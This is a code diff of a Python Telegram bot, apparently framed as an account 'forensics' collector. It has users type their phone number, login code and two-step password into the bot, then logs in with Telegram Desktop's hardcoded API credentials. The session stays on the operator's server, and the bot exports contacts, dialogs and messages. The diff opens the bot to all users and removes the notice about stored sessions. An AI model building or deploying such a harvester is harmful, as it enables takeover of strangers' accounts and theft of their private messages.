@@ -1,9 +1,9 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-Telegram Intelligence Collector Bot v2.0
-ربات forensics تلگرام بدون نیاز به api_id/api_hash از کاربر
-(فقط شماره تلفن + کد تأیید + رمز عبور رمزنگاری)
+Telegram Intelligence Collector Bot v3.0
+بدون نیاز به API_ID/API_HASH/AUTHORIZED_USERS
+فقط TELEGRAM_BOT_TOKEN لازمه
 """
 
 import os
@@ -20,7 +20,7 @@ import logging
 from datetime import datetime
 from pathlib import Path
 from typing import Dict, Any, List, Optional, Tuple, Set
-from dataclasses import dataclass, asdict
+from dataclasses import dataclass
 
 from dotenv import load_dotenv
 from Crypto.Cipher import AES
@@ -37,6 +37,8 @@ from telegram.ext import (
 )
 from telegram.constants import ParseMode
 
+# ==================== Telethon Import ====================
+TELETHON_AVAILABLE = False
 try:
     from telethon import TelegramClient
     from telethon.tl.types import (
@@ -54,56 +56,56 @@ try:
     from telethon.tl.functions.contacts import (
         GetContactsRequest, GetBlockedRequest,
     )
-    from telethon.tl.functions.messages import (
-        GetDialogsRequest,
-    )
+    from telethon.tl.functions.messages import GetDialogsRequest
     from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest
     from telethon.errors import SessionPasswordNeededError, FloodWaitError
     TELETHON_AVAILABLE = True
-except ImportError:
-    TELETHON_AVAILABLE = False
-    print("❌ نصب: pip install telethon")
+    print("✅ Telethon loaded")
+except Exception as e:
+    print(f"❌ Telethon error: {e}")
+    sys.exit(1)
 
-# ==================== بارگذاری .env ====================
+# ==================== Settings ====================
 load_dotenv()
 
-# ==================== تنظیمات ====================
-VERSION = "2.0"
+VERSION = "3.0"
 PBKDF2_ITERATIONS = 600_000
 MODULE_TIMEOUT = 180
 
+# 🔑 API پیش‌فرض از Telegram Desktop (public)
+# اگر در .env مقدار داشتی، از اون استفاده می‌شه
+DEFAULT_API_ID = 2040
+DEFAULT_API_HASH = "b18441a1ff607e10a989891a5462e627"
+
 BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN')
-if not BOT_TOKEN:
-    print("❌ متغیر TELEGRAM_BOT_TOKEN در .env تنظیم نشده!")
-    sys.exit(1)
+API_ID = int(os.environ.get('API_ID', DEFAULT_API_ID))
+API_HASH = os.environ.get('API_HASH', DEFAULT_API_HASH)
 
-# 🔑 API Credentials از سازنده ربات (از .env)
-API_ID_STR = os.environ.get('API_ID')
-API_HASH = os.environ.get('API_HASH')
-if not API_ID_STR or not API_HASH:
-    print("❌ API_ID و API_HASH باید در .env تنظیم شوند (از my.telegram.org سازنده)")
-    sys.exit(1)
-try:
-    API_ID = int(API_ID_STR)
-except ValueError:
-    print("❌ API_ID باید عدد باشد!")
-    sys.exit(1)
-
-# لیست کاربران مجاز (توصیه می‌شود حتماً پر شود!)
+# AUTHORIZED_USERS کاملاً اختیاری
 AUTHORIZED_USERS_STR = os.environ.get('AUTHORIZED_USERS', '')
 AUTHORIZED_USERS: Set[int] = set()
 if AUTHORIZED_USERS_STR.strip():
     try:
         AUTHORIZED_USERS = {int(uid.strip()) for uid in AUTHORIZED_USERS_STR.split(',') if uid.strip()}
-    except ValueError:
-        print("⚠️  فرمت AUTHORIZED_USERS اشتباه!")
+    except:
+        pass
 
+print("=" * 60)
+print(f"🤖 Bot v{VERSION}")
+print(f"🔑 API_ID: {API_ID} ({'custom' if API_ID != DEFAULT_API_ID else 'default'})")
+print(f"👥 Auth: {len(AUTHORIZED_USERS) if AUTHORIZED_USERS else 'ALL'}")
+print("=" * 60)
+
+if not BOT_TOKEN:
+    print("❌ TELEGRAM_BOT_TOKEN not set!")
+    sys.exit(1)
+
+# ==================== Paths ====================
 SESSION_DIR = Path("sessions")
 SESSION_DIR.mkdir(exist_ok=True)
 OUTPUT_DIR = Path("outputs")
 OUTPUT_DIR.mkdir(exist_ok=True)
 
-# Conversation States
 (SELECT_LEVEL, ENTER_PHONE, ENTER_CODE, ENTER_2FA, 
  ENTER_ENC_PASSWORD, CONFIRM_ENC_PASSWORD,
  DECRYPT_UPLOAD, DECRYPT_PASSWORD) = range(8)
@@ -136,7 +138,6 @@ class TelegramIntelCollector:
         self.phone = phone
         self.user_id = user_id
         self.config = config or CollectionConfig()
-        # session file منحصر به فرد برای هر user_id + phone
         safe_phone = phone.replace('+', '').replace(' ', '')
         self.session_file = str(SESSION_DIR / f"user_{user_id}_{safe_phone}")
         self.client: Optional[TelegramClient] = None
@@ -153,7 +154,6 @@ class TelegramIntelCollector:
                 pass
     
     async def connect(self) -> Tuple[bool, Optional[str]]:
-        """اتصال اولیه - برمی‌گرداند (success, stage)"""
         try:
             self.client = TelegramClient(self.session_file, API_ID, API_HASH)
             await self.client.connect()
@@ -519,7 +519,7 @@ class TelegramIntelCollector:
         return json.loads(gzip.decompress(compressed).decode('utf-8'))
 
 
-# ==================== ربات ====================
+# ==================== Bot ====================
 
 class IntelBot:
     def __init__(self):
@@ -536,15 +536,14 @@ class IntelBot:
         
         await update.message.reply_text(
             f"👋 سلام <b>{u.first_name}</b>!\n\n"
-            "🤖 <b>Telegram Intel Collector v2.0</b>\n\n"
+            "🤖 <b>Telegram Intel Collector v3.0</b>\n\n"
             "📊 <b>دستورات:</b>\n"
             "/collect - جمع‌آوری forensics\n"
             "/decrypt - رمزگشایی فایل\n"
             "/revoke - پایان session\n"
             "/help - راهنما\n\n"
-            "✅ <b>تفاوت با نسخه قبلی:</b>\n"
-            "نیازی به <code>api_id</code> و <code>api_hash</code> نیست!\n"
-            "فقط شماره تلفن و کد تأیید.",
+            "✅ <b>ساده و سریع:</b>\n"
+            "فقط شماره تلفن و کد تأیید!",
             parse_mode=ParseMode.HTML
         )
         return ConversationHandler.END
@@ -554,13 +553,12 @@ class IntelBot:
             "📖 <b>راهنما</b>\n\n"
             "🔹 <b>/collect</b> - شروع جمع‌آوری\n"
             "🔹 <b>/decrypt</b> - رمزگشایی فایل .enc\n"
-            "🔹 <b>/revoke</b> - حذف session ذخیره شده\n"
+            "🔹 <b>/revoke</b> - حذف session\n"
             "🔹 <b>/cancel</b> - لغو عملیات\n\n"
             "🔐 <b>امنیت:</b>\n"
             "• AES-256-GCM + PBKDF2 (600k iterations)\n"
-            "• فایل‌ها بعد از ارسال پاک می‌شوند\n"
-            "• Session file فقط روی سرور ذخیره می‌شود\n\n"
-            "⚠️ <b>فقط برای استفاده قانونی روی اکانت خودتان</b>",
+            "• فایل‌ها بعد از ارسال پاک می‌شوند\n\n"
+            "⚠️ <b>فقط برای اکانت خودتون</b>",
             parse_mode=ParseMode.HTML
         )
     
@@ -574,13 +572,11 @@ class IntelBot:
         return ConversationHandler.END
     
     async def cmd_revoke(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """حذف session ذخیره شده"""
         uid = update.effective_user.id
         collector = self.collectors.pop(uid, None)
         if collector:
             await collector.disconnect()
         
-        # پاک کردن همه session files این user
         count = 0
         for f in SESSION_DIR.glob(f"user_{uid}_*"):
             try:
@@ -589,11 +585,7 @@ class IntelBot:
             except:
                 pass
         
-        await update.message.reply_text(
-            f"✅ {count} session file حذف شد.\n\n"
-            "برای استفاده مجدد باید دوباره کد تأیید بگیرید.",
-            parse_mode=ParseMode.HTML
-        )
+        await update.message.reply_text(f"✅ {count} session حذف شد.")
     
     async def collect_start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         uid = update.effective_user.id
@@ -602,19 +594,18 @@ class IntelBot:
             return ConversationHandler.END
         
         keyboard = [
-            [InlineKeyboardButton("1️⃣ Basic - پایه", callback_data="lvl_1")],
-            [InlineKeyboardButton("2️⃣ Normal - کامل", callback_data="lvl_2")],
-            [InlineKeyboardButton("3️⃣ Full - همه چیز ⭐", callback_data="lvl_3")],
-            [InlineKeyboardButton("4️⃣ Extreme - حداکثر 🔥", callback_data="lvl_4")],
+            [InlineKeyboardButton("1️⃣ Basic", callback_data="lvl_1")],
+            [InlineKeyboardButton("2️⃣ Normal", callback_data="lvl_2")],
+            [InlineKeyboardButton("3️⃣ Full ⭐", callback_data="lvl_3")],
+            [InlineKeyboardButton("4️⃣ Extreme 🔥", callback_data="lvl_4")],
         ]
         
         await update.message.reply_text(
             "🎚️ <b>سطح جمع‌آوری:</b>\n\n"
-            "• <b>Basic:</b> اطلاعات پایه فقط\n"
-            "• <b>Normal:</b> بدون داده‌های حساس\n"
-            "• <b>Full:</b> کامل + حساس ⭐\n"
-            "• <b>Extreme:</b> همه چیز + OSINT 🔥\n\n"
-            "یک گزینه انتخاب کنید:",
+            "• <b>Basic:</b> پایه\n"
+            "• <b>Normal:</b> بدون حساس\n"
+            "• <b>Full:</b> کامل ⭐\n"
+            "• <b>Extreme:</b> حداکثر 🔥",
             reply_markup=InlineKeyboardMarkup(keyboard),
             parse_mode=ParseMode.HTML
         )
@@ -626,10 +617,8 @@ class IntelBot:
         level = q.data.split('_')[1]
         context.user_data['level'] = level
         
-        names = {"1": "Basic", "2": "Normal", "3": "Full", "4": "Extreme"}
         await q.edit_message_text(
-            f"✅ سطح <b>{names[level]}</b> انتخاب شد.\n\n"
-            "📱 <b>شماره تلفن اکانت تلگرام</b> را وارد کنید:\n"
+            "📱 <b>شماره تلفن</b> را وارد کنید:\n"
             "مثال: <code>+989121234567</code>",
             parse_mode=ParseMode.HTML
         )
@@ -638,10 +627,8 @@ class IntelBot:
     async def receive_phone(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         phone = update.message.text.strip()
         if not re.match(r'^\+\d{10,15}$', phone):
-            await update.message.reply_text(
-                "❌ فرمت اشتباه. مثال: <code>+989121234567</code>",
-                parse_mode=ParseMode.HTML
-            )
+            await update.message.reply_text("❌ فرمت اشتباه. مثال: <code>+989121234567</code>",
+                                           parse_mode=ParseMode.HTML)
             return ENTER_PHONE
         
         context.user_data['phone'] = phone
@@ -664,7 +651,7 @@ class IntelBot:
             config.max_messages_per_chat = 500
             config.max_dialogs = 5000
         
-        status = await update.message.reply_text("🔄 در حال اتصال...")
+        status = await update.message.reply_text("🔄 اتصال...")
         
         collector = TelegramIntelCollector(phone, uid, config)
         self.collectors[uid] = collector
@@ -673,19 +660,15 @@ class IntelBot:
         
         if success:
             await status.edit_text(
-                f"✅ متصل شد!\n\n"
+                f"✅ متصل!\n\n"
                 f"👤 <b>{collector.me.first_name}</b>\n"
                 f"🆔 <code>{collector.me.id}</code>\n\n"
-                "🔑 <b>رمز عبور برای رمزنگاری فایل</b> را وارد کنید\n"
-                "(حداقل 8 کاراکتر، برای دانلود امن):",
+                "🔑 <b>رمز رمزنگاری</b> (حداقل 8 کاراکتر):",
                 parse_mode=ParseMode.HTML
             )
             return ENTER_ENC_PASSWORD
         elif msg == "awaiting_code":
-            await status.edit_text(
-                f"📱 کد تأیید به تلگرام شما ارسال شد.\n\n"
-                "🔑 کد 5 رقمی را وارد کنید:"
-            )
+            await status.edit_text("📱 کد تأیید ارسال شد.\n\n🔑 کد 5 رقمی:")
             return ENTER_CODE
         else:
             await status.edit_text(f"❌ خطا: {msg}")
@@ -696,37 +679,31 @@ class IntelBot:
     async def receive_code(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         code = update.message.text.strip()
         if not re.match(r'^\d{4,6}$', code):
-            await update.message.reply_text("❌ کد باید 4-6 رقم باشد.")
+            await update.message.reply_text("❌ کد 4-6 رقم.")
             return ENTER_CODE
         
         uid = update.effective_user.id
         collector = self.collectors.get(uid)
         if not collector:
-            await update.message.reply_text("❌ Session منقضی شد. دوباره /collect بزنید.")
+            await update.message.reply_text("❌ Session منقضی. /collect")
             return ConversationHandler.END
         
-        status = await update.message.reply_text("🔄 در حال تأیید...")
+        status = await update.message.reply_text("🔄 تأیید...")
         success, msg = await collector.verify_code(code)
         
         if success:
             await status.edit_text(
-                f"✅ ورود موفق!\n\n"
-                f"👤 <b>{collector.me.first_name}</b>\n"
-                f"🆔 <code>{collector.me.id}</code>\n\n"
-                "🔑 <b>رمز عبور برای رمزنگاری فایل</b> را وارد کنید\n"
-                "(حداقل 8 کاراکتر):",
+                "✅ ورود موفق!\n\n"
+                "🔑 <b>رمز رمزنگاری</b> (حداقل 8 کاراکتر):",
                 parse_mode=ParseMode.HTML
             )
             return ENTER_ENC_PASSWORD
         elif msg == "awaiting_2fa":
-            await status.edit_text(
-                "🔒 اکانت <b>تأیید دو مرحله‌ای</b> دارد.\n\n"
-                "🔑 رمز دو مرحله‌ای را وارد کنید:",
-                parse_mode=ParseMode.HTML
-            )
+            await status.edit_text("🔒 <b>2FA فعال</b>\n\n🔑 رمز دو مرحله‌ای:",
+                                  parse_mode=ParseMode.HTML)
             return ENTER_2FA
         else:
-            await status.edit_text(f"❌ کد اشتباه: {msg}\n\nدوباره وارد کنید:")
+            await status.edit_text(f"❌ کد اشتباه: {msg}")
             return ENTER_CODE
     
     async def receive_2fa(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -734,22 +711,21 @@ class IntelBot:
         uid = update.effective_user.id
         collector = self.collectors.get(uid)
         if not collector:
-            await update.message.reply_text("❌ Session منقضی شد.")
+            await update.message.reply_text("❌ Session منقضی.")
             return ConversationHandler.END
         
-        status = await update.message.reply_text("🔄 در حال تأیید...")
+        status = await update.message.reply_text("🔄 تأیید...")
         success, msg = await collector.verify_2fa(password)
         
         if success:
             await status.edit_text(
-                f"✅ ورود موفق!\n\n"
-                "🔑 <b>رمز عبور برای رمزنگاری فایل</b> را وارد کنید\n"
-                "(حداقل 8 کاراکتر):",
+                "✅ ورود موفق!\n\n"
+                "🔑 <b>رمز رمزنگاری</b> (حداقل 8 کاراکتر):",
                 parse_mode=ParseMode.HTML
             )
             return ENTER_ENC_PASSWORD
         else:
-            await status.edit_text(f"❌ رمز اشتباه: {msg}\n\nدوباره:")
+            await status.edit_text(f"❌ رمز اشتباه: {msg}")
             return ENTER_2FA
     
     async def receive_enc_password(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -758,31 +734,29 @@ class IntelBot:
             await update.message.reply_text("❌ حداقل 8 کاراکتر!")
             return ENTER_ENC_PASSWORD
         context.user_data['enc_password'] = pw
-        await update.message.reply_text("🔑 رمز عبور را <b>دوباره</b> وارد کنید (برای تأیید):",
-                                        parse_mode=ParseMode.HTML)
+        await update.message.reply_text("🔑 تکرار رمز:")
         return CONFIRM_ENC_PASSWORD
     
     async def confirm_enc_password(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         pw = update.message.text.strip()
         if pw != context.user_data.get('enc_password'):
-            await update.message.reply_text("❌ مطابقت ندارند! دوباره:")
+            await update.message.reply_text("❌ مطابقت نداره!")
             return ENTER_ENC_PASSWORD
         
         uid = update.effective_user.id
         collector = self.collectors.get(uid)
         if not collector:
-            await update.message.reply_text("❌ Session منقضی شد.")
+            await update.message.reply_text("❌ Session منقضی.")
             return ConversationHandler.END
         
         status = await update.message.reply_text(
-            "🚀 <b>شروع جمع‌آوری...</b>\n\n"
-            "⏳ ممکنه چند دقیقه طول بکشه.",
+            "🚀 <b>شروع...</b>\n\n⏳ چند دقیقه...",
             parse_mode=ParseMode.HTML
         )
         
         async def progress(msg):
             try:
-                await status.edit_text(f"🚀 <b>در حال جمع‌آوری...</b>\n\n{msg}",
+                await status.edit_text(f"🚀 <b>جمع‌آوری...</b>\n\n{msg}",
                                        parse_mode=ParseMode.HTML)
             except:
                 pass
@@ -803,21 +777,19 @@ class IntelBot:
             elapsed = data['_metadata']['elapsed']
             
             summary = (
-                "✅ <b>جمع‌آوری کامل شد!</b>\n\n"
+                "✅ <b>کامل شد!</b>\n\n"
                 f"👤 <b>{collector.me.first_name}</b>\n"
-                f"🆔 <code>{collector.me.id}</code>\n"
-                f"⏱️ زمان: {elapsed:.1f} ثانیه\n"
-                f"✅ ماژول‌ها: {stats['executed']}/{stats['executed']+stats['failed']}\n"
-                f"💾 حجم: {mb:.2f} MB\n\n"
-                "📤 در حال ارسال..."
+                f"⏱️ {elapsed:.1f}s\n"
+                f"✅ {stats['executed']}/{stats['executed']+stats['failed']}\n"
+                f"💾 {mb:.2f} MB\n\n"
+                "📤 ارسال..."
             )
             await status.edit_text(summary, parse_mode=ParseMode.HTML)
             
             caption = (
                 f"🔐 Intel Report\n"
                 f"👤 {collector.me.first_name}\n"
-                f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M')}\n"
-                f"🔑 AES-256-GCM + PBKDF2"
+                f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M')}"
             )
             
             try:
@@ -828,7 +800,7 @@ class IntelBot:
                         caption=caption,
                     )
             except Exception as e:
-                await update.message.reply_text(f"⚠️ خطای ارسال: {e}")
+                await update.message.reply_text(f"⚠️ خطا: {e}")
             
             try:
                 output.unlink()
@@ -837,7 +809,7 @@ class IntelBot:
             
         except Exception as e:
             await status.edit_text(f"❌ خطا: {e}")
-            logger.exception("Error in collection")
+            logger.exception("Error")
         
         return ConversationHandler.END
     
@@ -847,20 +819,20 @@ class IntelBot:
             return ConversationHandler.END
         
         await update.message.reply_text(
-            "🔓 <b>حالت رمزگشایی</b>\n\n"
-            "📎 فایل <code>.enc</code> رمزنگاری شده را ارسال کنید:",
+            "🔓 <b>رمزگشایی</b>\n\n"
+            "📎 فایل <code>.enc</code>:",
             parse_mode=ParseMode.HTML
         )
         return DECRYPT_UPLOAD
     
     async def decrypt_file(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not update.message.document:
-            await update.message.reply_text("❌ لطفاً فایل ارسال کنید.")
+            await update.message.reply_text("❌ فایل ارسال کن.")
             return DECRYPT_UPLOAD
         
         doc = update.message.document
         if not doc.file_name.endswith('.enc'):
-            await update.message.reply_text("❌ فقط فایل‌های .enc")
+            await update.message.reply_text("❌ فقط .enc")
             return DECRYPT_UPLOAD
         
         f = await doc.get_file()
@@ -868,7 +840,7 @@ class IntelBot:
         await f.download_to_drive(str(path))
         context.user_data['dec_file'] = str(path)
         
-        await update.message.reply_text("🔑 رمز عبور را وارد کنید:")
+        await update.message.reply_text("🔑 رمز:")
         return DECRYPT_PASSWORD
     
     async def decrypt_password(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -876,10 +848,10 @@ class IntelBot:
         path = context.user_data.get('dec_file')
         
         if not path or not Path(path).exists():
-            await update.message.reply_text("❌ فایل گم شد. /decrypt")
+            await update.message.reply_text("❌ فایل گم شد.")
             return ConversationHandler.END
         
-        status = await update.message.reply_text("🔄 در حال رمزگشایی...")
+        status = await update.message.reply_text("🔄 رمزگشایی...")
         
         try:
             data = TelegramIntelCollector.decrypt(path, pw)
@@ -887,12 +859,12 @@ class IntelBot:
             json_path = Path(path).with_suffix('.json')
             json_path.write_text(json.dumps(data, ensure_ascii=False, indent=2), encoding='utf-8')
             
-            await status.edit_text("✅ رمزگشایی موفق! در حال ارسال...")
+            await status.edit_text("✅ موفق! ارسال...")
             
             with open(json_path, 'rb') as f:
                 await update.message.reply_document(
                     document=f, filename=json_path.name,
-                    caption="🔓 فایل رمزگشایی شده (JSON)"
+                    caption="🔓 JSON"
                 )
             
             try:
@@ -902,33 +874,27 @@ class IntelBot:
                 pass
             
         except ValueError:
-            await status.edit_text("❌ رمز اشتباه یا فایل خراب!")
+            await status.edit_text("❌ رمز اشتباه!")
         except Exception as e:
             await status.edit_text(f"❌ خطا: {e}")
         
         return ConversationHandler.END
     
     async def unknown_text(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        await update.message.reply_text(
-            "❓ دستور نامفهوم.\n\n/start را بزنید."
-        )
+        await update.message.reply_text("❓ /start")
 
 
 def main():
     if not TELETHON_AVAILABLE:
-        print("❌ Telethon نصب نیست: pip install telethon")
+        print("❌ Telethon not available!")
         sys.exit(1)
     
-    print("=" * 60)
-    print("🤖 Telegram Intel Collector Bot v2.0")
-    print(f"✅ API_ID: {API_ID} (از .env)")
-    print(f"🔐 Authorized users: {len(AUTHORIZED_USERS) or 'ALL'}")
+    print("\n🚀 Starting bot...")
     print("=" * 60)
     
     bot = IntelBot()
     app = Application.builder().token(BOT_TOKEN).build()
     
-    # ConversationHandler برای /collect
     collect_conv = ConversationHandler(
         entry_points=[CommandHandler("collect", bot.collect_start)],
         states={
@@ -942,7 +908,6 @@ def main():
         fallbacks=[CommandHandler("cancel", bot.cmd_cancel)],
     )
     
-    # ConversationHandler برای /decrypt
     decrypt_conv = ConversationHandler(
         entry_points=[CommandHandler("decrypt", bot.decrypt_start)],
         states={
@@ -959,8 +924,8 @@ def main():
     app.add_handler(decrypt_conv)
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, bot.unknown_text))
     
-    print("\n🚀 ربات در حال اجرا...")
-    print("   Ctrl+C برای توقف\n")
+    print("✅ Bot is running!")
+    print("=" * 60)
     app.run_polling(allowed_updates=Update.ALL_TYPES)
 
 
